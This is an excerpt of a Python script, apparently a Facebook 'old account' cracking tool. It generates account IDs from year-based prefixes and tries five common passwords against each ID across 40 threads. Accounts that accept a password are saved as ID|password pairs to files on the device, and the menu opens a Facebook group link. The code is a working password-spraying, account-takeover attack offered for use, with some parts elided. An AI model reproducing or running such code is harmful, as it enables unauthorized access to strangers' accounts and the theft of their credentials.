...
os.system("git pull");os.system("xdg-open https://facebook.com/groups/417519034701028/");time.sleep(2);os.system("clear")
#▬▭▬▭▬▭▬▭[MODULE]▬▭▬▭▬▭▬▭#
try:import pystyle
...
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀         ▀  ▀         ▀"""" siyam"))
info=(f"""{style}{green} FACEBOOK {white}➤ {green} Md siysm
{style}{green} STATUS   {white}➤ {green}{version}
{style}{green} GITHUB   {white}➤ {green}github.com/SIY1AM-TR1CKER""")
def main_logo():
...
def main():
    ...
    if year_select in ['A','a','01','1']:os.system("xdg-open https://facebook.com/groups/417519034701028/");old_2011_2014()
    elif year_select in ['B','b','02','2']:os.system("xdg-open https://facebook.com/groups/417519034701028/");old_2009_2010()
    elif year_select in ['c','C','03','3']:os.system("xdg-open https://facebook.com/groups/417519034701028/");main()
    elif year_select in ['6','f','06','F']:os.system("xdg-open https://facebook.com/groups/417519034701028/");old_2008()
    elif year_select in ['O','o','00','0']:os.system("xdg-open https://facebook.com/groups/417519034701028/");os.system("exit")
    else:main()
#▬▭▬▭▬▭▬▭[OLD MENU]▬▭▬▭▬▭▬▭#
def old_2011_2014():
    user=[]
    ...
    tl = str(len(user))
    with ThreadPool(max_workers=40) as siyam:
        main_logo()
        ...
        for mal in user:
            uid=year_code+mal
            if method in ["01","1","A","a"]:siyam.submit(_method_A_,uid,user)
            elif method in ["02","2","B","b"]:siyam.submit(_method_B_,uid,user)
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            ...
            if "session_key" in mtd_A:
                ...
                open("/sdcard/siyam-OLD-M1--OK.txt","a").write(uid+"|"+pw+"\n")
                break 
            elif "Please Confirm Email" in str(mtd_A):
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/siyam-OLD-M1-OKK.txt","a").write(uid+"|"+pw+"\n")
                break
            else:continue
        loop+=1
...
def _method_B_(uid,user):
    global oks,loop 
    Session=requests.session();agent = siyam_ua()
    ...
    try:
        ...
        for pw in ["123456","1234567","12345678","123456789","123123"]:
            ...
            if "session_key" in mtd_B:
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/siyam-OLD-M2-OK.txt","a").write(uid+"|"+pw+"\n")
                break 
            elif "Please Confirm Email" in str(mtd_B):
                oks.append(uid)
                print(f"\r\r{red}[{green1}SUCCESS{red}] {green}{uid} {red}»{green} {pw}")
                open("/sdcard/siyam-OLD-M2-OKK.txt","a").write(uid+"|"+pw+"\n")
                break
            else:continue
        loop+=1
    except Exception as e:
